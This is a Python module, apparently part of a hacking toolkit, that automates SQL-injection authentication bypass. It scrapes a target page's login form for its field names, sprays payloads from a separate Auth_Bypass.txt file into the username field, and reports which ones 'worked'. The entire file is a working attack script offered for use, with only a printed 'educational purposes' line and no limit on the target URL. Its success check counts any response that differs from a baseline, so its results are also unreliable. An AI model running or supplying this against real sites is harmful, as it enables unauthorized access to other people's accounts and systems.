# packages/sqlinject.py

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from pystyle import System
import os

def detect_form_fields(url):
    try:
        r = requests.get(url, timeout=5)
        r.raise_for_status()
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch URL: {e}")
        return None, None, None

    soup = BeautifulSoup(r.text, 'html.parser')
    form = soup.find('form')
    if not form:
        print(f"{Fore.YELLOW}[!] No form found on the page.")
        return None, None, None

    method = form.get('method', 'get').lower()

    inputs = form.find_all('input')
    user_field = None
    pass_field = None

    for inp in inputs:
        t = inp.get('type', '').lower()
        n = inp.get('name')
        if not n:
            continue
        if t in ['text', 'email'] and not user_field:
            user_field = n
        elif t == 'password' and not pass_field:
            pass_field = n

    if not user_field or not pass_field:
        print(f"{Fore.YELLOW}[!] Could not detect username and/or password fields.")
    else:
        print(f"{Fore.CYAN}[+] Detected form method: {method.upper()}, user field: '{user_field}', pass field: '{pass_field}'")

    return method, user_field, pass_field

def load_payloads(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Payload file '{filename}' not found.")
        return []

def baseline_response(url, method, user_field, pass_field):
    data = {user_field: 'normaluser', pass_field: 'normalpass'}
    try:
        if method == 'post':
            resp = requests.post(url, data=data)
        else:
            resp = requests.get(url, params=data)
        return resp.text
    except Exception:
        return ""

def run(args, commands):
    init(autoreset=True)

    print(fr"""{Fore.GREEN}
    ______
    |____|
    __||__
    |SQLi|
    |made|
    |by  |
    |MR.A|
     \__/
      ||
      ||
      /\
     |__|

""")
    print(f"{Fore.CYAN}Welcome to the SQL Injection Attack Script!\n")
    print("This script will try to detect login fields automatically and test SQL injection.")
    print("Make sure you use it only for educational purposes.\n")
    print("NOTE: MAKE SURE YOU GOT A Auth_Bypass.txt FILE IN THE SAME DIRECTORY AS THIS SCRIPT! which will contain the payloads to use.\n")

    url = input("Enter target login page URL (e.g., http://127.0.0.1:5000/):\nURL >> ").strip()

    if not url:
        print(f"{Fore.RED}[!] URL is required.")
        return

    method, user_field, pass_field = detect_form_fields(url)
    if not user_field or not pass_field:
        user_field, pass_field = 'username', 'password'
        method = 'post'
        print(f"{Fore.YELLOW}[!] Falling back to default fields: username, password and POST method.")

    payload_file = 'Auth_Bypass.txt'
    payloads = load_payloads(payload_file)
    if not payloads:
        print(f"{Fore.RED}[!] No payloads loaded, exiting.")
        return

    print(f"{Fore.CYAN}[+] Getting baseline response for comparison...")
    base_resp = baseline_response(url, method, user_field, pass_field).lower()

    success_indicator = input("Enter success indicator text (e.g. 'welcome', 'dashboard', 'logged in'): ").strip().lower()
    if not success_indicator:
        success_indicator = 'welcome'

    print(f"\n{Fore.CYAN}[+] Starting tests...\n")

    for payload in payloads:
        data = {user_field: payload, pass_field: 'irrelevant'}
        try:
            if method == 'post':
                resp = requests.post(url, data=data, timeout=7)
            else:
                resp = requests.get(url, params=data, timeout=7)
            content = resp.text.lower()

            if success_indicator in content or content != base_resp:
                print(f"{Fore.GREEN}[✓] Payload worked: {payload}")
            else:
                print(f"{Fore.RED}[x] Payload failed: {payload}")

        except requests.RequestException as e:
            print(f"{Fore.YELLOW}[!] Request error: {e}")

    print(f"\n{Style.BRIGHT}{Fore.CYAN}[*] Testing complete.")
